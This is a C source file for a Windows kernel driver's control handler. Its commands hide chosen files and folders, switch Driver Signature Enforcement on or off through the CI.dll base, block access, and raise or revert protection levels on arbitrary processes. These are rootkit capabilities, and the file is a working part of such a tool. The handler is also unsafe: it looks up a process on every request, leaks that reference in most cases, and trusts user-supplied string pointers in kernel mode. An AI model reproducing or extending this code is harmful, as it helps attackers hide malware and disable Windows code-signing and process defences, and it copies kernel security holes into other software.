#include "dFsFilter.h"
#include "dProcessProtection.h"
#include "dSignEnforce.h"
#include "ioctl.h"

NTSTATUS DeviceIoControlHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG_PTR information = 0;

    PPROTECTION_VALUES pValues = (PPROTECTION_VALUES)Irp->AssociatedIrp.SystemBuffer;
    PEPROCESS eProcess;

    PsLookupProcessByProcessId((HANDLE)pValues->pid, &eProcess);

    switch (irpSp->Parameters.DeviceIoControl.IoControlCode) {
    case IOCTL_SET_TARGET_FOLDER:
        if (irpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(UNICODE_STRING)) {
            PUNICODE_STRING newTargetFolder = (PUNICODE_STRING)Irp->AssociatedIrp.SystemBuffer;
            if (newTargetFolder->Buffer != NULL && newTargetFolder->Length > 0) {
                BOOLEAN isDuplicate = FALSE;
                for (ULONG i = 0; i < gTargetFolderCount; i++) {
                    if (RtlEqualUnicodeString(newTargetFolder, &gTargetFolders[i], TRUE)) {
                        isDuplicate = TRUE;
                        RtlFreeUnicodeString(&gTargetFolders[i]);
                        status = RtlDuplicateUnicodeString(RTL_DUPLICATE_UNICODE_STRING_NULL_TERMINATE, newTargetFolder, &gTargetFolders[i]);
                        if (NT_SUCCESS(status)) {
                            DbgPrint("Target folder replaced: %wZ\n", newTargetFolder);
                        }
                        else {
                            DbgPrint("Failed to replace target folder: 0x%08X\n", status);
                        }
                        break;
                    }
                }
                if (!isDuplicate) {
                    if (gTargetFolderCount < ARRAYSIZE(gTargetFolders)) {
                        status = RtlDuplicateUnicodeString(RTL_DUPLICATE_UNICODE_STRING_NULL_TERMINATE, newTargetFolder, &gTargetFolders[gTargetFolderCount]);
                        if (NT_SUCCESS(status)) {
                            gTargetFolderCount++;
                            DbgPrint("Target folder added: %wZ\n", newTargetFolder);
                        }
                        else {
                            DbgPrint("Failed to add target folder: 0x%08X\n", status);
                        }
                    }
                    else {
                        status = STATUS_INSUFFICIENT_RESOURCES;
                    }
                }
            }
            else {
                status = STATUS_INVALID_PARAMETER;
            }
        }
        else {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;
    case IOCTL_SET_TARGET_FILE:
        if (irpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(UNICODE_STRING)) {
            PUNICODE_STRING newTargetFile = (PUNICODE_STRING)Irp->AssociatedIrp.SystemBuffer;
            if (newTargetFile->Buffer != NULL && newTargetFile->Length > 0) {
                BOOLEAN isDuplicate = FALSE;
                for (ULONG i = 0; i < gTargetFileCount; i++) {
                    if (RtlEqualUnicodeString(newTargetFile, &gTargetFiles[i], TRUE)) {
                        isDuplicate = TRUE;
                        RtlFreeUnicodeString(&gTargetFiles[i]);
                        status = RtlDuplicateUnicodeString(RTL_DUPLICATE_UNICODE_STRING_NULL_TERMINATE, newTargetFile, &gTargetFiles[i]);
                        if (NT_SUCCESS(status)) {
                            DbgPrint("Target file replaced: %wZ\n", newTargetFile);
                            PrintCurrentHiddenTargets(); // we only need one, no need to set in IOCTL_SET_TARGET_FOLDER
                        }
                        else {
                            DbgPrint("Failed to replace target file: 0x%08X\n", status);
                        }
                        break;
                    }
                }
                if (!isDuplicate) {
                    if (gTargetFileCount < ARRAYSIZE(gTargetFiles)) {
                        status = RtlDuplicateUnicodeString(RTL_DUPLICATE_UNICODE_STRING_NULL_TERMINATE, newTargetFile, &gTargetFiles[gTargetFileCount]);
                        if (NT_SUCCESS(status)) {
                            gTargetFileCount++;
                            DbgPrint("Target file added: %wZ\n", newTargetFile);
                            PrintCurrentHiddenTargets(); // we only need one, no need to set in IOCTL_SET_TARGET_FOLDER
                        }
                        else {
                            DbgPrint("Failed to add target file: 0x%08X\n", status);
                        }
                    }
                    else {
                        status = STATUS_INSUFFICIENT_RESOURCES;
                    }
                }
            }
            else {
                status = STATUS_INVALID_PARAMETER;
            }
        }
        else {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;
    case IOCTL_SET_CI_DLL_BASE:
        if (irpSp->Parameters.DeviceIoControl.InputBufferLength == sizeof(PVOID)) {
            g_CiDllBase = *(PVOID*)Irp->AssociatedIrp.SystemBuffer;
            FindAndPrintCiInitializeSymbol(g_CiDllBase);
            DbgPrint("CI_DLL_BASE set to: %p\n", g_CiDllBase);
        }
        else {
            status = STATUS_INVALID_PARAMETER;
        }
        break;
    case IOCTL_SET_DSE_MODE:
        if (irpSp->Parameters.DeviceIoControl.InputBufferLength == sizeof(DSE_MODE)) {
            PDSE_MODE pDseMode = (PDSE_MODE)Irp->AssociatedIrp.SystemBuffer;
            g_EnableDSE = pDseMode->EnableDSE;
            FindAndPrintCiInitializeSymbol(g_CiDllBase);
            DbgPrint("DSE mode set to: %s\n", g_EnableDSE ? "Enabled" : "Disabled");
        }
        else {
            status = STATUS_INVALID_PARAMETER;
        }
        break;
    case IOCTL_BLOCK_ACCESS:
        gBlockAccess = TRUE;
        DbgPrint("Access blocking enabled.\n");
        break;
    case IOCTL_UNBLOCK_ACCESS:
        gBlockAccess = FALSE;
        DbgPrint("Access blocking disabled.\n");
        break;
    case IOCTL_UNHIDE_ALL_FILES:
        UnhideAllFiles();
        break;
    case IOCTL_SET_PROTECTION:
        PrintPSProtectionAddress(eProcess, pValues->Signer, pValues->Type);
        ObDereferenceObject(eProcess);
        break;
    case IOCTL_REVERT_PROTECTION:
        RevertProtection(eProcess);
        ObDereferenceObject(eProcess);
        break;
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = information;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

void DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    FilterUnload(0);
}

NTSTATUS CreateCloseHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}
